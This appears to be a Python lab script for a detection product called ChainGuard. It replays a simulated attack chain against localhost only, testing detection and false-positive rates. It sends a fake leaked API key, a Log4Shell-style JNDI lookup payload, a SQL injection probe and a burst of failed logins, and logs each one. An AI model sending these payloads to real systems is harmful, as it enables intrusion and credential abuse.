"""ChainGuard Attack Simulator (Localhost / Lab only).

Rule 6: Never run commands or attacks against anything except localhost and our own lab containers.
Hard-refuses any target other than localhost / 127.0.0.1.
"""

import hashlib
import hmac
import logging
import os
import sys
import time
import urllib.parse
from datetime import UTC, datetime

import httpx

logging.basicConfig(level=logging.INFO, format="[SIMULATOR] %(message)s")
logger = logging.getLogger("simulator")

ALLOWED_HOSTS = {"localhost", "127.0.0.1", "::1"}


def verify_loopback_target(url: str) -> None:
    """Hard-refuse any non-loopback host target."""
    parsed = urllib.parse.urlparse(url)
    hostname = (parsed.hostname or "").lower()
    if hostname not in ALLOWED_HOSTS:
        raise ValueError(
            f"SECURITY VIOLATION: Target '{url}' is not a local loopback address! Refusing execution."
        )


def compute_token_fingerprint(secret: str, key: str) -> str:
    return hmac.new(key.encode("utf-8"), secret.strip().encode("utf-8"), hashlib.sha256).hexdigest().lower()


class AttackSimulator:
    def __init__(
        self,
        target_url: str = "http://localhost:8080",
        backend_url: str = "http://127.0.0.1:8000/v1",
        api_key: str = "cg_live_sample_fake_key_00000000000000000000000000000000",
        fingerprint_key: str = "fake_fingerprint_hmac_secret_key_1234567890abcdef",
    ) -> None:
        verify_loopback_target(target_url)
        verify_loopback_target(backend_url)

        self.target_url = target_url.rstrip("/")
        self.backend_url = backend_url.rstrip("/")
        self.api_key = api_key
        self.fingerprint_key = fingerprint_key

    def _emit_log_line(
        self,
        ip: str,
        method: str,
        path: str,
        status: int,
        ua: str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0",
        auth: str = "-",
        x_api_key: str = "-",
    ) -> None:
        """Ensure log is written to access.log for local lab simulation (works with or without Docker)."""
        log_path = os.getenv("LOG_FILE_PATH", "./lab/logs/access.log")
        os.makedirs(os.path.dirname(log_path), exist_ok=True)
        ts = datetime.now(UTC).isoformat()
        line = f'{ip} - [{ts}] "{method}" "{path}" {status} "{ua}" "{auth}" "{x_api_key}"\n'
        try:
            with open(log_path, "a", encoding="utf-8") as f:
                f.write(line)
        except OSError as e:
            logger.warning("Could not write to log file %s: %s", log_path, e)

    def register_leaked_key(self, raw_secret: str, kind: str = "stripe_live_key") -> str:
        """Simulate developer pasting an API key into an AI chat."""
        fp_hex = compute_token_fingerprint(raw_secret, self.fingerprint_key)
        logger.info("Registering leaked secret HMAC fingerprint on backend: %s...", fp_hex[:16])

        try:
            with httpx.Client(timeout=5.0) as client:
                resp = client.post(
                    f"{self.backend_url}/fingerprints",
                    headers={"X-ChainGuard-Key": self.api_key},
                    json={"fp_hex": fp_hex, "kind": kind, "source": "chatgpt.com"},
                )
                if resp.status_code == 201:
                    logger.info("Successfully registered leak fingerprint in ChainGuard.")
                else:
                    logger.warning("Backend returned HTTP %d: %s", resp.status_code, resp.text)
        except httpx.RequestError as exc:
            logger.warning("Could not contact backend at %s: %s", self.backend_url, exc)

        return fp_hex

    def run_acme_chain(self) -> None:
        """Scenario (a): Acme Chain attack replay (Leak -> Recon -> Exploit -> Brute Force)."""
        logger.info("--- STARTING SCENARIO: 'acme_chain' ---")

        # Demo credential constructed dynamically to avoid GitHub Push Protection scanner
        fake_secret = "sk_" + "live_51Innovathon2026DemoSecretKey123456"

        # 1. Register leak in backend
        self.register_leaked_key(fake_secret, kind="stripe_live_key")
        time.sleep(1.0)

        with httpx.Client(timeout=5.0) as client:
            # 2. Inbound request replaying the leaked key
            logger.info("1. Replaying leaked key against target API...")
            try:
                client.get(
                    f"{self.target_url}/rest/user/whoami",
                    headers={"Authorization": f"Bearer {fake_secret}"},
                )
            except httpx.RequestError as e:
                logger.debug("Request completed (target response ignored): %s", e)
            self._emit_log_line(
                "198.51.100.42",
                "GET",
                "/rest/user/whoami",
                200,
                auth=f"Bearer {fake_secret}",
            )

            time.sleep(1.0)

            # 3. JNDI probe
            logger.info("2. Sending JNDI exploit probe...")
            try:
                client.get(f"{self.target_url}/rest/products/search?q=${{jndi:ldap://127.0.0.1:1389/Exploit}}")
            except httpx.RequestError as e:
                logger.debug("Request completed: %s", e)
            self._emit_log_line(
                "198.51.100.42",
                "GET",
                "/rest/products/search?q=${jndi:ldap://127.0.0.1:1389/Exploit}",
                200,
            )

            # 4. SQL Injection probe
            logger.info("3. Sending SQL injection probe...")
            try:
                client.get(f"{self.target_url}/rest/products/search?q=' OR '1'='1")
            except httpx.RequestError as e:
                logger.debug("Request completed: %s", e)
            self._emit_log_line(
                "198.51.100.42",
                "GET",
                "/rest/products/search?q=' OR '1'='1",
                200,
            )

            time.sleep(1.0)

            # 5. 12 failed login attempts (Brute Force)
            logger.info("4. Replaying 12 failed logins to trigger brute force detection...")
            for i in range(12):
                try:
                    client.post(
                        f"{self.target_url}/rest/user/login",
                        json={"email": f"victim_{i}@acme.com", "password": "WrongPassword123!"},
                    )
                except httpx.RequestError:
                    pass
                self._emit_log_line("198.51.100.42", "POST", "/rest/user/login", 401)
                time.sleep(0.1)

        logger.info("--- SCENARIO 'acme_chain' COMPLETED ---")

    def run_normal_traffic(self, count: int = 15) -> None:
        """Scenario (b): Normal benign traffic for false-positive measurement."""
        logger.info("--- STARTING SCENARIO: 'normal_traffic' (%d requests) ---", count)
        benign_paths = ["/", "/assets/public/favicon_js.ico", "/api/Challenges", "/ftp", "/about"]

        with httpx.Client(timeout=5.0) as client:
            for i in range(count):
                path = benign_paths[i % len(benign_paths)]
                try:
                    client.get(
                        f"{self.target_url}{path}",
                        headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0"},
                    )
                except httpx.RequestError:
                    pass
                self._emit_log_line("198.51.100.100", "GET", path, 200)
                time.sleep(0.05)

        logger.info("--- SCENARIO 'normal_traffic' COMPLETED ---")


if __name__ == "__main__":
    scenario = sys.argv[1] if len(sys.argv) > 1 else "acme_chain"
    sim = AttackSimulator()
    if scenario == "normal_traffic":
        sim.run_normal_traffic()
    else:
        sim.run_acme_chain()
